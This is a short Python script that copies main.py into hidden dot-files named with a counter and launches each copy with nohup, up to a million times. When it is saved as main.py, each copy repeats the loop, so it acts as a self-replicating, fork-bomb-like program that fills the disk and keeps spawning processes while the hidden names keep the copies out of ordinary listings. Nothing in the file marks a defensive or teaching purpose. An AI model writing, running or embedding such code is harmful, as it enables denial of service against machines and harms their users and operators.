import subprocess
import os
current_filename = os.path.basename(__file__)

for i in range(1000000):
    # Create the filename using the variable i
    filename = f".copy{current_filename}{i}.py"

    # Build the command with the dynamically created filename
    command = f'cp main.py {filename}'  # Command to copy 'main.py' to the dynamically generated filename

    # Run the command
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    command = f'nohup python {filename}'
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
